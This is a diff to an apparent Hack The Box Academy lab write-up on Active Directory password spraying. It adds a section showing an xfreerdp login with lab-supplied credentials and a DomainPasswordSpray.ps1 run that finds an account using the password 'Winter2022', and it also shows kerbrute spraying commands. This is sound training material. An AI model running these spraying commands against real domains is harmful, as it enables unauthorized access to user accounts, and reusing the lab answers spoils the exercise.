@@ -372,3 +372,26 @@ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  W
 Kerbrute returned a valid login that starts with the letter "s", confirming the user has the password Welcome1.
 
 [![Screenshot-2025-03-14-134928.png](https://i.postimg.cc/020jMgBq/Screenshot-2025-03-14-134928.png)](https://postimg.cc/bsdpW5P6)
+
+
+## Internal Password Spraying - from Windows
+
+> RDP to 10.129.208.127 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"
+
+* **Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.**
+
+I initiated an RDP connection to the target Windows host 10.129.9.169 using xfreerdp with the provided credentials:
+
+```c
+xfreerdp /v:10.129.9.169 /u:htb-student /p:Academy_student_AD!
+```
+Once connected, I launched PowerShell with administrative privileges, navigated to the C:\Tools directory, and executed DomainPasswordSpray.ps1:
+```c
+PS C:\Tools> Import-Module .\DomainPasswordSpray.ps1
+PS C:\Tools> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+The DomainPasswordSpray attack successfully discovered a user account with the password "Winter2022".
+
+[![Screenshot-2025-03-14-143415.png](https://i.postimg.cc/dV4Vt8SR/Screenshot-2025-03-14-143415.png)](https://postimg.cc/VJ08Kbw5)
+
